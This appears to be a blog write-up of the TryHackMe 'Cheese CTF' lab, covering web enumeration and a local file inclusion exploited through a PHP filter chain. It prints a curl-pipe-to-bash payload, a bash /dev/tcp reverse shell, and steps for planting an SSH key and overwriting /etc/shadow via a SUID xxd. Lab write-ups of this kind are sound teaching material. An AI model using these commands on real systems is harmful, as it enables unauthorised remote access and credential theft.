---
title: THM Cheese CTF
author: hanhctf
date: 2024-10-01 12:00:00 +0700
categories: [Write-up, THM]
tags: [PHP Filters Chain, LFI]
toc: true
mermaid: true
---

# [**Cheese CTF**](https://tryhackme.com/r/room/cheesectfv10)

# Summary

> - Emumeration hidden.
> - LFI --> PHP Filters Chain RCE --> revershell.
> - Writeable /.ssh/authorized_key --> SSH.
> - Systemd Timer --> xxd SUID  

## NMAP

Too many open port so I focus on port 22, 80, 443.

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b1:c1:22:9f:11:10:5f:64:f1:33:72:70:16:3c:80:06 (RSA)
|   256 6d:33:e3:bd:70:62:59:93:4d:ab:8b:fe:ef:e8:a7:b2 (ECDSA)
|_  256 89:2e:17:84:ed:48:7a:ae:d9:8c:9b:a5:8e:24:04:bd (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: The Cheese Shop
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  https?
```

## Web Enumeration

On the homepage, nothing interesting.  
FUZZ directory with `ffuf`, we found nothing interesting.
So FUZZ with extension `.html`, `.php`, `.txt`

```shell
ffuf -w /opt/SecLists/Discovery/Web-Content/big.txt -u http://10.10.56.241/FUZZ -e .html,.php,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.56.241/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/big.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 359ms]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 359ms]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 358ms]
.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 359ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 359ms]
.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 366ms]
.htpasswd.html          [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 367ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1278ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 363ms]
index.html              [Status: 200, Size: 1759, Words: 559, Lines: 60, Duration: 352ms]
login.php               [Status: 200, Size: 834, Words: 220, Lines: 29, Duration: 359ms]
messages.html           [Status: 200, Size: 448, Words: 59, Lines: 19, Duration: 363ms]
orders.html             [Status: 200, Size: 380, Words: 61, Lines: 19, Duration: 356ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 354ms]
users.html              [Status: 200, Size: 377, Words: 61, Lines: 19, Duration: 350ms]
:: Progress: [81904/81904] :: Job [1/1] :: 114 req/sec :: Duration: [0:12:30] :: Errors: 0 ::
```

Some interesting page `massages.html`, `orders.html`, `users.html`.  
Focus on every page abow.

![](/commons/THM/CheeseCTF/0_PHPFilter.png)

`secret-script.php?file=php://filter/resource=supersecretmessageforadmin`.  
First in my mind is LFI. After try emumeration with FLI, can not find anything.  
Google search `LFI php://filter` and found this [exploit](https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/).

Follow the exploit.  
Clone [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator).  
First create a shell script named "revshell" in local machine.

```shell
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

Second create a chain using a generator.  
Replace the ip address with your own.  

```shell
python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.10.10.10/revshell|bash` ?>'
```

Three, we need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.

```text
# terminal 1
sudo python3 -m http.server 80

# terminal 2
nc -lvnp 9001
```

Now access to `/?page=<generated_chain>`. We can get a shell.  
I use burpsuite to access it.

![](/commons/THM/CheeseCTF/1_reveshell.png).

![](/commons/THM/CheeseCTF/2_revershell.png).

After got `www-data` revershell.  
I upload `linpeas.sh` to `/tmp`.  
With `linpeas.sh`, We can see we have write permission on `/home/comte/.ssh/authorized_keys`.  

Generate an `ida_rsa.pub` and write it in `/home/comte/.ssh/authorized_keys`.  
We can SSH with **`comte`**.

***GOT USER FLAG***

From **comte**, continous upload `linpeas.sh` and see any vector to privilege escalation.  

We can run `systemctl exploit.timer` as `sudo` without password.  
![](/commons/THM/CheeseCTF/4_sudo.png)

Belong that, we have write privileges over `/etc/systemd/system/exploit.timer`.  
![](/commons/THM/CheeseCTF/5_write.png)

Check detail in `exploit.timer` and `exploit.service`.

![](/commons/THM/CheeseCTF/6_timer.png)

![](/commons/THM/CheeseCTF/7_service.png)

Gather the above information.  
The exploit steps would be:  

Modify the exploit.timer file data.  
Change `OnbootSec=` to `OnBootSec=1min`.

![](/commons/THM/CheeseCTF/8_change.png)

Relaunch exploit.timer to execute exploit.service.

```shell
    sudo /bin/systemctl daemon-reload
    sudo /bin/systemctl restart exploit.timer
    sudo /bin/systemctl start exploit.timer
```

And then we have /opt/xxd with SUID.

![](/commons/THM/CheeseCTF/9_suid.png)

Use [GTFOBINS](https://gtfobins.github.io/gtfobins/xxd/) we can read `/root/root.txt`.

In this write-up, I want use *File write* to gaince **root**.

First, copy all data `/etc/shadow` to **shadow**

```shell
A=/etc/shadow
/opt/xxd "$A" | /opt/xxd -r > shadow
```

`mkpasswd -m sha512crypt` to generate a hash for any password on attacker machine.  
I use `password` for password.

![](/commons/THM/CheeseCTF/10_pass.png)

Repalce `password` hash to password hash of **root** in `shadow`.

![](/commons/THM/CheeseCTF/11_hash.png)

Now, we can do
```shell
LFILE=/etc/shadow
cat exploit | /opt/xxd | /opt/xxd -r - "$LFILE" 
```

to write the contents of the `shadow` file we have created with the new root password hash to `/etc/shadow`.  

We can just use the switch user command to root `su root` and put in our password. We’re root!

![](/commons/THM/CheeseCTF/12_root.png)

***GOT ROOT FLAG***
